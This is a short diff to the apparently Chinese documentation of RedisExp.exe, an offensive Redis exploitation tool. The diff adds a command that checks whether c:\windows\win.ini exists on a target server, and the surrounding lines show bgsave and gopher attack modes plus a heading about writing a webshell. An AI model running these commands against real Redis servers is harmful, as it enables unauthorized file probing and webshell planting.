@@ -60,6 +60,8 @@ RedisExp.exe -m gopher -r 目标IP -p 目标端口 -f gopher模板文件
 执行 bgsave：
 RedisExp.exe -m bgsave -r 目标IP -p 目标端口 -w 密码
 
+判断文件：
+RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rf c:\windows\win.ini
 ```
 
 gopher 写webshell模板
